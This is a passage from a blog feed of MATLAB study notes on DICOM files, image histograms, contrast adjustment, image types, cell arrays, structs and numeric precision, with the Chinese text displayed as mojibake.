imtool.</code></p><hr><p>the image data in this DICOM file is signed <code>16-bit data</code>, you must use the autoscaling syntax with either display function to make the image viewable.<br><code>imshow(I,&#39;DisplayRange&#39;,[])</code></p><hr><p>use the <code>dicomanon function</code>. Remove Confidential Information</p><hr><p>To write image data or metadata to a file in DICOM format, use the <code>dicomwrite function</code>.</p><hr><h4 id="Create-New-DICOM-Series"><a href="#Create-New-DICOM-Series" class="headerlink" title="Create New DICOM Series"></a>Create New DICOM Series</h4><pre><code>info.SeriesInstanceUID</code></pre><p>Generate a new DICOM unique identifier (UID) using the <code>dicomuid function.</code></p><pre><code>uid = dicomuidinfo.SeriesInstanceUID = uid;dicomwrite(Imodified,&apos;ankle_newseries.dcm&apos;,info);</code></pre><hr><p>The example finds the maximum and minimum values of all pixels in the image. The pixels that form the white <code>text characters</code>are<code>set to the maximum pixel value</code>. </p><hr><p>MATLAB command prompt: Enter dicomBrowser.</p><hr><p><a href="https://ww2.mathworks.cn/help/releases/R2018a/images/image-type-conversions.html" title="Image Type Conversion" target="_blank" rel="noopener">Image Type Conversion</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabå›¾åƒç¤ºä¾‹ç¬”è®°1</title>
      <link href="/2020/02/06/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B01/"/>
      <url>/2020/02/06/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h3 id="å¯¹æ¯”åº¦"><a href="#å¯¹æ¯”åº¦" class="headerlink" title="å¯¹æ¯”åº¦"></a>å¯¹æ¯”åº¦</h3><p>histogram  ç›´æ–¹å›¾<br>Precede the call to <code>imhist</code>with the <code>figure</code>command so that the histogram does not overwrite the display of the image I in the current figure window.</p><p>To see the distribution of intensities in the image, <code>create a histogram by calling the imhist</code> function.<br>è¾“å…¥å›¾ç‰‡ï¼Œå›¾ç‰‡è¦æ±‚ä¸ºç°åº¦å›¾æˆ–è€…äºŒå€¼å›¾ imhist<br><a id="more"></a><br>    F=imread(â€˜test.jpgâ€™);<br>    I=rgb2gray(F);<br>    [count,x]=imhist(Iï¼Œ30)</p><p><del>% è·å–ç›´æ–¹å›¾çš„æ¨ªåæ ‡å’Œçºµåæ ‡ï¼Œå³å„ä¸ªåƒç´ çº§ï¼Œä»¥åŠæ¯ä¸ªåƒç´ çº§ä¸Šçš„åƒç´ å‡ºç°çš„æ¬¡æ•°<br>figure;</del></p><pre><code>subplot(221);imhist(I,2);subplot(222);imhist(I,5);subplot(223);imhist(I,10);subplot(224);imhist(I);figure;subplot(121); imhist(I,10)[count,x] = imhist(I,10)subplot(122);stem(x,count);</code></pre><blockquote><p>stem<br>ç»˜åˆ¶ç¦»æ•£åºåˆ—æ•°æ®</p></blockquote><p><code>Improve the contrast</code>in an image, using the <code>histeq function</code>. The toolbox includes several other functions that perform contrast adjustment, including <code>imadjust</code> and <code>adapthisteq</code>, and interactive tools such as the Adjust Contrast tool, available in the Image Viewer<br>adjust the contrast </p><blockquote><p>ç°åº¦ç›´æ–¹å›¾å‡è¡¡åŒ–histeq</p></blockquote><hr><h3 id="Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects"><a href="#Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects" class="headerlink" title="Correct Nonuniform Background Illumination and Analyze Foreground Objects"></a>Correct Nonuniform Background Illumination and Analyze Foreground Objects</h3><p>nonuniform</p><blockquote><p>strelï¼ˆï¼‰<br>Morphological structuring element</p></blockquote><p><code>J = imopen(I,SE)</code>performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the <code>strel or offsetstrel functions</code>. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations.</p><p>surf<br>æ›²é¢å›¾å…¨é¡µæŠ˜å <br>è¯­æ³•<br>surf(X,Y,Z)<br>surf(X,Y,Z,C)</p><p><code>f1=imadjustï¼ˆfï¼Œ[low_in  high_in],[low_out  high_out],gammaï¼‰</code><br>è¯¥å‡½æ•°çš„æ„ä¹‰å¦‚å›¾1æ‰€ç¤ºï¼ŒæŠŠå›¾åƒf ç°åº¦å˜æ¢åˆ°æ–°å›¾åƒf1çš„è¿‡ç¨‹ä¸­ï¼Œf ä¸­ç°åº¦å€¼<code>ä½äºlow_in</code>çš„åƒç´ ç‚¹åœ¨f1ä¸­ç°åº¦å€¼è¢«èµ‹å€¼ä¸º<code>low_out</code>,åŒç†ï¼Œfä¸­ç°åº¦å€¼<code>é«˜äºhigh_in</code>çš„åƒç´ ç‚¹å˜æ¢åˆ°f1æ—¶å…¶ç°åº¦å€¼ä¹Ÿè¢«èµ‹å€¼ä¸º<code>high_out</code>;</p><blockquote><p>J=imadjust(I,[0.2 0.5],[0 1])<br>åŸå›¾åƒç°åº¦èŒƒå›´ä¸º0-255ï¼Œç¨‹åºå°†å°äº255Ã—0.2çš„ç°åº¦å€¼è®¾ç½®ä¸º0ï¼Œå°†å¤§äº255Ã—0.5çš„ç°åº¦å€¼è®¾ç½®ä¸º255</p></blockquote><p>é¥±å’Œåº¦å–å†³äºè¯¥è‰²ä¸­å«è‰²æˆåˆ†å’Œæ¶ˆè‰²æˆåˆ†ï¼ˆç°è‰²ï¼‰çš„æ¯”ä¾‹<br>æ¯”åº¦æŒ‡çš„æ˜¯ä¸€å¹…å›¾åƒä¸­æ˜æš—åŒºåŸŸæœ€äº®çš„ç™½å’Œæœ€æš—çš„é»‘ä¹‹é—´ä¸åŒäº®åº¦å±‚çº§çš„æµ‹é‡ï¼Œå·®å¼‚èŒƒå›´è¶Šå¤§ä»£è¡¨å¯¹æ¯”è¶Šå¤§</p><p>Use the<code>imbinarize function</code> to convert the grayscale image into a<code>binary image</code></p><p><code>Remove background noise</code> from the image with the<code>bwareaopen function</code>.</p><p>F = false(sz1,â€¦,szN) æ˜¯ç”±é€»è¾‘å€¼â€œ0â€ç»„æˆçš„ sz1Ã—â€¦Ã—szN æ•°ç»„ï¼Œå…¶ä¸­ sz1,â€¦,szN è¡¨ç¤ºæ¯ä¸ªç»´åº¦çš„å¤§å°ã€‚ä¾‹å¦‚ï¼Œfalse(2,3) è¿”å›ç”±é€»è¾‘å€¼â€œ0â€ç»„æˆçš„ 2Ã—3 æ•°ç»„ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabç¬”è®°5 image</title>
      <link href="/2020/02/05/matlab%E7%AC%94%E8%AE%B05/"/>
      <url>/2020/02/05/matlab%E7%AC%94%E8%AE%B05/</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨åŸºäºå¸•æ–¯å¡ä¸‰è§’å½¢çš„é¡¹åˆ›å»ºä¸€ä¸ªå¯¹ç§°çŸ©é˜µï¼š<br><code>A = pascal(3)</code></p><p>randi çš„ç¬¬ä¸€ä¸ªè¾“å…¥æè¿°æ•´æ•°å¯èƒ½å€¼çš„èŒƒå›´ï¼Œåé¢ä¸¤ä¸ªè¾“å…¥æè¿°è¡Œå’Œåˆ—çš„æ•°é‡ã€‚<br><code>C = randi(10,3,2)</code></p><p>æœ‰ä¸€ä¸ªä¸“é—¨çš„ç‚¹ç§¯å‡½æ•°ï¼Œç§°ä¸º <code>dot</code>ã€‚<br><a id="more"></a><br>éå…±è½­å¤æ•°è½¬ç½®ï¼ˆå…¶ä¸­æ¯ä¸ªå…ƒç´ çš„å¤æ•°éƒ¨åˆ†ä¿ç•™å…¶ç¬¦å·ï¼‰è¡¨ç¤ºä¸º<code>z.&#39;</code></p><p><code>eye(m,n)</code><br>è¿”å› mÃ—n çŸ©å½¢å•ä½çŸ©é˜µï¼Œeye(n) è¿”å› nÃ—n å•ä½æ–¹é˜µã€‚</p><p>å‘é‡ x çš„ p-èŒƒæ•°ï¼Œ<br><code>norm(x,p)</code> è¿›è¡Œè®¡ç®—ï¼Œæ­¤è¿ç®—æ˜¯ä¸º p &gt; 1 çš„ä»»æ„å€¼å®šä¹‰çš„ï¼Œä½†æœ€å¸¸è§çš„ p å€¼ä¸º 1ã€2 å’Œ âˆã€‚é»˜è®¤å€¼ä¸º p = 2ï¼Œ</p><p><code>x = b/A</code><br>è¡¨ç¤ºä½¿ç”¨ mrdivide è·å¾—çš„çŸ©é˜µæ–¹ç¨‹ xA = b çš„è§£ã€‚<br><code>x = A\b</code><br>è¡¨ç¤ºä½¿ç”¨ mldivide è·å¾—çš„çŸ©é˜µæ–¹ç¨‹ Ax = b çš„è§£ã€‚</p><p><code>(b/A)&#39; = (A&#39;\b&#39;)</code>.<br>m = n<br>æ–¹é˜µæ–¹ç¨‹ç»„ã€‚æ±‚ç²¾ç¡®è§£ã€‚<br>m &gt; n<br>è¶…å®šæ–¹ç¨‹ç»„ï¼Œå³æ–¹ç¨‹ä¸ªæ•°å¤šäºæœªçŸ¥æ•°ä¸ªæ•°ã€‚æ±‚æœ€å°äºŒä¹˜è§£ã€‚<br>m &lt; n<br>æ¬ å®šæ–¹ç¨‹ç»„ï¼Œå³æ–¹ç¨‹ä¸ªæ•°å°‘äºæœªçŸ¥æ•°ä¸ªæ•°ã€‚ä½¿ç”¨æœ€å¤š m ä¸ªéé›¶åˆ†é‡æ±‚åŸºæœ¬è§£ã€‚</p><p><em>éå¥‡å¼‚çŸ©é˜µ==å¯é€†çŸ©é˜µ</em></p><p><code>eig</code><br>ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡</p><p>æä¾›çš„æ•°æ®åˆ†æå‡½æ•°çš„åˆ—è¡¨ï¼Œè¯·é”®å…¥<br><code>help datafun</code></p><hr><h1 id="å›¾åƒ"><a href="#å›¾åƒ" class="headerlink" title="å›¾åƒ"></a>å›¾åƒ</h1><p>è¦æ˜¾ç¤ºå›¾åƒï¼Œè¯·ä½¿ç”¨ imshow å‡½æ•°ï¼š<br><code>imshow(X,map)</code><br>ä½¿ç”¨<code>imread</code> å‡½æ•°å¯ä»¥è¯»å–æ ‡å‡†å›¾åƒæ–‡ä»¶ï¼ˆTIFFã€JPEGã€PNG ç­‰ï¼‰ã€‚imread è¿”å›çš„æ•°æ®ç±»å‹å–å†³äºè¯»å–çš„å›¾åƒç±»å‹ã€‚<br>ä½¿ç”¨<code>imwrite</code> å‡½æ•°å¯ä»¥å°† MATLAB æ•°æ®å†™å…¥åˆ°å„ç§æ ‡å‡†å›¾åƒæ ¼å¼ã€‚<br>å¤§å¤šæ•°å›¾åƒè¡¨ç¤ºä¸ºäºŒç»´æ•°ç»„ï¼ˆçŸ©é˜µï¼‰ï¼Œå…¶ä¸­çŸ©é˜µçš„æ¯ä¸ªå…ƒç´ å¯¹åº”æ‰€æ˜¾ç¤ºå›¾åƒçš„ä¸€ä¸ªåƒç´ ã€‚ä¾‹å¦‚ï¼Œç”± 200 è¡Œå’Œ 300 åˆ—ä¸åŒé¢œè‰²çš„ç‚¹ç»„æˆçš„å›¾åƒä¿å­˜ä¸ºä¸€ä¸ª 200Ã—300 çš„çŸ©é˜µã€‚æœ‰äº›å›¾åƒï¼Œå¦‚ RGBï¼Œéœ€è¦ä¸‰ç»´æ•°ç»„ï¼Œå…¶ä¸­ä¸‰ä¸ªç»´åº¦çš„ç¬¬ä¸€ä¸ªå¹³é¢è¡¨ç¤ºçº¢è‰²åƒç´ å¼ºåº¦ï¼Œç¬¬äºŒä¸ªå¹³é¢è¡¨ç¤ºç»¿è‰²åƒç´ å¼ºåº¦ï¼Œç¬¬ä¸‰ä¸ªå¹³é¢è¡¨ç¤ºè“è‰²åƒç´ å¼ºåº¦ã€‚<br>MATLAB æ•°å­¦æ”¯æŒä¸‰ç§ä¸åŒçš„æ•°å€¼ç±»ç”¨äºå›¾åƒæ˜¾ç¤ºï¼š<br>åŒç²¾åº¦æµ®ç‚¹æ•°ï¼ˆdoubleï¼‰<br>16 ä½æ— ç¬¦å·æ•´æ•°ï¼ˆuint16ï¼‰<br>8 ä½æ— ç¬¦å·æ•´æ•°ï¼ˆuint8ï¼‰</p><pre><code>imshow    æ˜¾ç¤ºå›¾åƒimage    ä»æ•°ç»„æ˜¾ç¤ºå›¾åƒimagesc    æ˜¾ç¤ºä½¿ç”¨ç»è¿‡æ ‡åº¦æ˜ å°„çš„é¢œè‰²çš„å›¾åƒimread    ä»å›¾å½¢æ–‡ä»¶è¯»å–å›¾åƒimresize    è°ƒæ•´å›¾åƒå¤§å°imwrite    å°†å›¾åƒå†™å…¥å›¾å½¢æ–‡ä»¶imfinfo    æœ‰å…³å›¾å½¢æ–‡ä»¶çš„ä¿¡æ¯imformats    ç®¡ç†å›¾åƒæ–‡ä»¶æ ¼å¼æ³¨å†Œè¡¨frame2im    è¿”å›ä¸å½±ç‰‡å¸§å…³è”çš„å›¾åƒæ•°æ®im2frame    å°†å›¾åƒè½¬æ¢ä¸ºå½±ç‰‡å¸§im2java    å°†å›¾åƒè½¬æ¢ Java å›¾åƒim2double    å°†å›¾åƒè½¬æ¢ä¸ºåŒç²¾åº¦å€¼ind2rgb    å°†ç´¢å¼•å›¾åƒè½¬æ¢ä¸º RGB å›¾åƒrgb2gray    å°† RGB å›¾åƒæˆ–é¢œè‰²å›¾è½¬æ¢ä¸ºç°åº¦å›¾rgb2ind    å°† RGB å›¾åƒè½¬æ¢ä¸ºç´¢å¼•å›¾åƒimapprox    é€šè¿‡å‡å°‘é¢œè‰²æ•°é‡æ¥è¿‘ä¼¼å¤„ç†ç´¢å¼•å›¾åƒdither    è½¬æ¢å›¾åƒï¼Œé€šè¿‡æŠ–åŠ¨æé«˜è¡¨è§‚é¢œè‰²åˆ†è¾¨ç‡cmpermute    é‡æ–°æ’åˆ—é¢œè‰²å›¾ä¸­çš„é¢œè‰²cmunique    æ¶ˆé™¤é¢œè‰²å›¾ä¸­çš„é‡å¤é¢œè‰²ï¼›å°†ç°åº¦æˆ–çœŸå½©è‰²å›¾åƒè½¬æ¢ä¸ºç´¢å¼•å›¾åƒ</code></pre><p><code>A = imread(&#39;ngc6543a.jpg&#39;);</code></p><hr><p>ç´¢å¼•å›¾åƒç”±æ•°æ®çŸ©é˜µ X å’Œé¢œè‰²å›¾çŸ©é˜µ map ç»„æˆã€‚map æ˜¯ä¸€ä¸ª double ç±»çš„ mÃ—3 æ•°ç»„ï¼Œç”± [0, 1] èŒƒå›´å†…çš„æµ®ç‚¹å€¼ç»„æˆã€‚map çš„æ¯ä¸€è¡ŒæŒ‡å®šå•ä¸€é¢œè‰²çš„çº¢ã€ç»¿å’Œè“åˆ†é‡ã€‚ç´¢å¼•å›¾åƒä½¿ç”¨åƒç´ å€¼åˆ°é¢œè‰²å›¾å€¼çš„â€œç›´æ¥æ˜ å°„â€ã€‚æ¯ä¸ªå›¾åƒåƒç´ çš„é¢œè‰²æ˜¯ä»¥ X ä¸­çš„å¯¹åº”å€¼ä¸ºç´¢å¼•æ±‚å¾—çš„ map ä¸­çš„å€¼ã€‚<strong>å› æ­¤ X å€¼å¿…é¡»æ˜¯æ•´æ•°ã€‚å€¼ 1 æŒ‡å‘ map ä¸­ç¬¬ä¸€è¡Œï¼Œå€¼ 2 æŒ‡å‘ç¬¬äºŒè¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚ä½¿ç”¨ä»¥ä¸‹è¯­å¥æ˜¾ç¤ºç´¢å¼•å›¾åƒã€‚</strong><br><code>image(X); colormap(map)</code><br>å›¾åƒçŸ©é˜µå’Œé¢œè‰²å›¾ä¸­å€¼çš„å…³ç³»å–å†³äºå›¾åƒçŸ©é˜µçš„ç±»ã€‚å¦‚æœå›¾åƒçŸ©é˜µæ˜¯ double ç±»ï¼Œé‚£ä¹ˆå€¼ 1 æŒ‡å‘é¢œè‰²å›¾ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå€¼ 2 æŒ‡å‘ç¬¬äºŒè¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚å¦‚æœå›¾åƒçŸ©é˜µæ˜¯ uint8 æˆ– uint16 ç±»ï¼Œé‚£ä¹ˆæœ‰ä¸ªåç§» - å€¼ 0 æŒ‡å‘é¢œè‰²å›¾ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå€¼ 1 æŒ‡å‘ç¬¬äºŒè¡Œï¼Œä»¥æ­¤ç±»æ¨ã€‚åœ¨å›¾å½¢æ–‡ä»¶æ ¼å¼ä¸­ä½¿ç”¨åç§»æ˜¯ä¸ºäº†ä½¿å¯æ”¯æŒçš„é¢œè‰²æ•°ç›®è¾¾åˆ°æœ€å¤§ã€‚åœ¨ä¸Šé¢çš„å›¾åƒä¸­ï¼Œå›¾åƒçŸ©é˜µæ˜¯ double ç±»ã€‚</p><hr><p>å¼ºåº¦å›¾åƒæ˜¯ä¸€ä¸ªæ•°æ®çŸ©é˜µ Iï¼Œå…¶ä¸­çš„å€¼è¡¨ç¤ºæŸä¸€èŒƒå›´å†…çš„å¼ºåº¦ã€‚å¼ºåº¦å›¾åƒè¡¨ç¤ºä¸ºå•ä¸ªçŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸ªå…ƒç´ å¯¹åº”ä¸€ä¸ªå›¾åƒåƒç´ ã€‚<br>imagesc(A); colormap(gray)<br>imagesc(A,[min(A(:)) max(A(:))]); colormap(gray)</p><hr><p>bit-depthï¼šä½¿ç”¨å¤šå°‘ä½æ¥å®šä¹‰ä¸€ä¸ªåƒç´ ç‚¹ã€‚bit-depthè¶Šå¤§ï¼Œå¯ä»¥è¡¨ç¤ºçš„è‰²å½©å°±è¶Šå¤šã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå›¾åƒçš„åƒç´ å€¼èŒƒå›´ä¸º0-255ï¼Œ åˆ™å…¶bit-depthå°±æ˜¯8ã€‚RGBå›¾åƒçš„bit-depthä¸º24ï¼š8bitè¡¨ç¤ºRï¼Œ8bitè¡¨ç¤ºGï¼Œ8bitè¡¨ç¤ºBã€‚</p><p>RGB å›¾åƒï¼Œæœ‰æ—¶ç§°ä¸ºçœŸå½©è‰²å›¾åƒï¼Œä»¥ mÃ—nÃ—3 æ•°æ®æ•°ç»„å½¢å¼å­˜å‚¨ï¼Œè¯¥æ•°ç»„å®šä¹‰äº†å¯¹åº”å›¾åƒæ¯ä¸ªåƒç´ çš„çº¢è‰²ã€ç»¿è‰²å’Œè“è‰²åˆ†é‡ã€‚<br><strong>ä¾‹å¦‚åƒç´  (10,5) çš„çº¢è‰²ã€ç»¿è‰²å’Œè“è‰²åˆ†é‡åˆ†åˆ«å­˜å‚¨åœ¨ RGB(10,5,1)ã€RGB(10,5,2) å’Œ RGB(10,5,3) ä¸­ã€‚</strong></p><hr><p>æ‚¨å¯ä»¥å¯¹ uint8 å’Œ uint16 æ•°ç»„æ‰§è¡Œå…¶ä»–å‡ ç§æ“ä½œï¼ŒåŒ…æ‹¬ï¼š<br>ä½¿ç”¨ reshapeã€catã€permute å‡½æ•°ä»¥åŠ [] å’Œ â€˜ è¿ç®—ç¬¦é‡æ„ã€é‡æ–°æ’åºå’Œä¸²è”æ•°ç»„<br>ä½¿ç”¨ save å’Œ load å°† uint8 å’Œ uint16 æ•°ç»„ä¿å­˜åŠåŠ è½½åˆ° MAT æ–‡ä»¶ã€‚ï¼ˆè¯·è®°ä½ï¼Œå¦‚æœè¦åŠ è½½æˆ–ä¿å­˜å›¾å½¢æ ¼å¼æ–‡ä»¶å›¾åƒï¼Œåˆ™å¿…é¡»ä½¿ç”¨ imread å’Œimwrite å‘½ä»¤ä»£æ›¿ã€‚ï¼‰<br>ä½¿ç”¨ find å®šä½ uint8 å’Œ uint16 æ•°ç»„ä¸­éé›¶å…ƒç´ çš„ç´¢å¼•ã€‚ä½†è¿”å›çš„æ•°ç»„å§‹ç»ˆä¸º double ç±»ã€‚<br>å…³ç³»è¿ç®—ç¬¦</p><p>åŸºäº NTSC æ ‡å‡†åˆå¹¶ RGB å€¼ï¼Œä»¥æ­¤æ–¹å¼æ¥è®¡ç®—å•è‰²äº®åº¦ï¼Œè¿™ä¼šå°†ä¸çœ¼ç›æ•æ„Ÿåº¦ç›¸å…³çš„ç³»æ•°åº”ç”¨åˆ° RGB é¢œè‰²ï¼š</p><pre><code>I = .2989*rgb_img(:,:,1)...    +.5870*rgb_img(:,:,2)...    +.1140*rgb_img(:,:,3);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabç¬”è®°4</title>
      <link href="/2020/02/03/matlab%E7%AC%94%E8%AE%B04/"/>
      <url>/2020/02/03/matlab%E7%AC%94%E8%AE%B04/</url>
      
        <content type="html"><![CDATA[<pre><code>B = A - 8.5B(1:2,2:3) = 0x = [2.1 1.7 1.6 1.5 NaN 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8];x = x(isfinite(x))x =  2.1 1.7 1.6 1.5 1.9 1.8 1.5 5.1 1.8 1.4 2.2 1.6 1.8x = x(abs(x-mean(x)) &lt;= 3*std(x))x =  2.1 1.7 1.6 1.5 1.9 1.8 1.5 1.8 1.4 2.2 1.6 1.8</code></pre><a id="more"></a><hr><p>find å‡½æ•°å¯ç”¨äºç¡®å®šä¸æŒ‡å®šé€»è¾‘æ¡ä»¶ç›¸ç¬¦çš„æ•°ç»„å…ƒç´ çš„ç´¢å¼•ã€‚find ä»¥æœ€ç®€å•çš„å½¢å¼è¿”å›ç´¢å¼•çš„åˆ—å‘é‡ã€‚è½¬ç½®è¯¥å‘é‡ä»¥ä¾¿è·å–ç´¢å¼•çš„è¡Œå‘é‡ã€‚</p><pre><code>k = find(isprime(A))&apos;k =     2     5     9    10    11    13</code></pre><p><code>R = randn(3,4,5);</code></p><hr><p>MATLAB ä¸­çš„å…ƒèƒæ•°ç»„æ˜¯ä»¥å…¶ä»–æ•°ç»„çš„å‰¯æœ¬ä¸ºå…ƒç´ çš„å¤šç»´æ•°ç»„<br><code>C = {A sum(A) prod(prod(A))}</code><br>ã€‚ç¬¬ä¸€ï¼Œè¦æ£€ç´¢æŸä¸ªå…ƒèƒçš„å†…å®¹ï¼Œè¯·åœ¨èŠ±æ‹¬å·ä¸­ä½¿ç”¨ä¸‹æ ‡ã€‚ä¾‹å¦‚ï¼ŒC{1} æ£€ç´¢å¹»æ–¹çŸ©é˜µï¼ŒC{3} ä¸º 16!ã€‚ç¬¬äºŒï¼Œ<strong>å…ƒèƒæ•°ç»„åŒ…å«å…¶ä»–æ•°ç»„çš„å‰¯æœ¬ï¼Œè€Œä¸åŒ…å«æŒ‡å‘è¿™äº›æ•°ç»„çš„æŒ‡é’ˆ</strong>ã€‚</p><pre><code>M = cell(8,1); å…ƒèƒæ•°ç»„for n = 1:8   M{n} = magic(n);endM</code></pre><hr><p><code>v = [s; &#39;world&#39;]</code><br>å‚ç›´è”æ¥å­—ç¬¦å¹¶ç”Ÿæˆ</p><pre><code>v =   Hello   world</code></pre><p>char å‡½æ•°å¯æ‰§è¡Œè¿™ç§å¡«å……æ“ä½œã€‚ä¾‹å¦‚ï¼Œ<br><code>S = char(&#39;A&#39;,&#39;rolling&#39;,&#39;stone&#39;,&#39;gathers&#39;,&#39;momentum.&#39;)</code></p><p>ä¹Ÿå¯ä»¥å°†æ–‡æœ¬å­˜å‚¨åœ¨å…ƒèƒæ•°ç»„ä¸­ã€‚ä¾‹å¦‚ï¼Œ</p><p><code>C = {&#39;A&#39;;&#39;rolling&#39;;&#39;stone&#39;;&#39;gathers&#39;;&#39;momentum.&#39;}</code></p><p>å¯ä»¥å°†å¡«å……åçš„å­—ç¬¦æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦å‘é‡å…ƒèƒæ•°ç»„ï¼š<br><code>C = cellstr(S)</code><br>ä½¿ç”¨ä»¥ä¸‹è¯­å¥å¯ä»¥é€†è½¬æ­¤è¿‡ç¨‹<br><code>S = char(C)</code></p><hr><p>ç»“æ„ä½“æ˜¯å¤šç»´ MATLAB æ•°ç»„ï¼ŒåŒ…å«å¯æŒ‰æ–‡æœ¬å­—æ®µæ ‡å¿—ç¬¦è®¿é—®çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œ</p><pre><code>S.name = &apos;Ed Plum&apos;;S.score = 83;S.grade = &apos;B+&apos;S =      name: &apos;Ed Plum&apos;    score: 83    grade: &apos;B+&apos;</code></pre><p>å¯ä»¥ä¸€æ¬¡æ·»åŠ ä¸€ä¸ªå­—æ®µï¼Œ</p><pre><code>S(2).name = &apos;Toni Miller&apos;;S(2).score = 91;S(2).grade = &apos;A-&apos;;</code></pre><p>å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¯­å¥æ·»åŠ æ•´ä¸ªå…ƒç´ ï¼š</p><pre><code>S(3) = struct(&apos;name&apos;,&apos;Jerry Garcia&apos;,...                &apos;score&apos;,70,&apos;grade&apos;,&apos;C&apos;)</code></pre><p>é”®å…¥<br><code>S.score</code><br>ä¸é”®å…¥<br><code>S(1).score, S(2).score, S(3).score</code><br>ç›¸åŒï¼Œè¿™æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”åˆ—è¡¨ã€‚</p><pre><code>scores = [S.score]names = char(S.name)names = {S.name}[N1 N2 N3] = S.name</code></pre><p>è®¿é—®ç»“æ„ä½“æ•°æ®çš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨åŠ¨æ€å­—æ®µåç§°ã€‚è¿™äº›åç§°å°†å­—æ®µè¡¨ç¤ºä¸ºå˜é‡è¡¨è¾¾å¼ï¼ŒMATLAB ä¼šåœ¨è¿è¡Œæ—¶è®¡ç®—è¿™äº›è¡¨è¾¾å¼ã€‚æ­¤å¤„æ˜¾ç¤ºçš„ç‚¹-æ‹¬å·è¯­æ³•å°† expression ä½œä¸ºåŠ¨æ€å­—æ®µåç§°ï¼š<br><code>structName.(expression)</code><br>ä¾‹å¦‚ï¼Œè¦åœ¨å­—æ®µåç§°ä¸­è®¡ç®— expressionï¼Œå¹¶åœ¨è¡Œ 7 ä¸­çš„ 1 è‡³ 25 åˆ—å†…è·å–è¯¥å­—æ®µçš„å€¼ï¼Œè¯·ä½¿ç”¨<br><code>structName.(expression)(7,1:25)</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlabç¬”è®°3</title>
      <link href="/2020/02/02/matlab%E7%AC%94%E8%AE%B03/"/>
      <url>/2020/02/02/matlab%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<p>ç§‘å­¦è®°æ•°æ³•ä½¿ç”¨å­—æ¯ e æ¥æŒ‡å®š 10 æ¬¡æ–¹çš„ç¼©æ”¾å› å­<br>æµ®ç‚¹æ•°çš„æœ‰é™ç²¾åº¦çº¦ä¸º 16 ä½æœ‰æ•ˆå°æ•°ä½æ•°ï¼Œæœ‰é™èŒƒå›´çº¦ä¸º 10-308 è‡³ 10+308ã€‚åŒç²¾åº¦æ ¼å¼è¡¨ç¤ºçš„æ•°å­—çš„æœ€å¤§ç²¾åº¦ä¸º 52 ä½ã€‚æ•´æ•°çš„å¯ç”¨ç²¾åº¦ä¸º 8 ä½ã€16 ä½ã€32 ä½å’Œ 64 ä½</p><pre><code>x = uint64(36028797018963968);y = uint64(36028797018963972);</code></pre><a id="more"></a><hr><p>ä¾‹å¦‚ï¼Œsort å‡½æ•°æ ¹æ®é‡å€¼è¿›è¡Œæ’åºï¼Œå¦‚æœé‡å€¼ç›¸ç­‰ï¼Œåˆ™æ ¹æ®ç›¸ä½è§’åº¦æ’åºã€‚</p><pre><code>sort([3+4i, 4+3i])  é‡å€¼éƒ½ä¸º5ans =   4.0000 + 3.0000i   3.0000 + 4.0000iangle(3+4i)ans =    0.9273</code></pre><p>â€œç­‰äºâ€å…³ç³»è¿ç®—ç¬¦ == è¦æ±‚å®éƒ¨å’Œè™šéƒ¨ç›¸ç­‰ã€‚å…¶ä»–äºŒè¿›åˆ¶å…³ç³»è¿ç®—ç¬¦ &gt;ã€&lt;ã€&gt;= å’Œ &lt;= å¿½ç•¥æ•°å­—çš„è™šéƒ¨ï¼Œè€Œä»…è€ƒè™‘å®éƒ¨ã€‚</p><hr><p>æ•°ç»„è¿ç®—å¯¹æ„å»ºè¡¨éå¸¸æœ‰ç”¨ã€‚å‡å®š n ä¸ºåˆ—å‘é‡<br><code>n = (0:9)&#39;;</code><br>ç„¶åï¼Œ<br><code>pows = [n  n.^2  2.^n]</code><br>æ„å»ºä¸€ä¸ªå¹³æ–¹å’Œ 2 æ¬¡å¹‚çš„è¡¨ï¼š</p><pre><code>pows =     0     0     1     1     1     2     2     4     4     3     9     8     4    16    16     5    25    32     6    36    64     7    49   128     8    64   256     9    81   512</code></pre><hr><pre><code>format short gx = (1:0.1:2)&apos;;logs = [x log10(x)]</code></pre><p>æ„å»ºä¸€ä¸ªå¯¹æ•°è¡¨ã€‚</p><pre><code>logs =     1.0            0      1.1      0.04139     1.2      0.07918     1.3      0.11394     1.4      0.14613     1.5      0.17609     1.6      0.20412     1.7      0.23045     1.8      0.25527     1.9      0.27875     2.0      0.30103</code></pre><hr><p>æœ‰å…³åˆç­‰æ•°å­¦å‡½æ•°çš„åˆ—è¡¨ï¼Œè¯·é”®å…¥<br>help elfun<br>æœ‰å…³æ›´å¤šé«˜ç­‰æ•°å­¦å‡½æ•°å’ŒçŸ©é˜µå‡½æ•°çš„åˆ—è¡¨ï¼Œè¯·é”®å…¥<br>help specfun<br>help elmat</p><hr><p>format 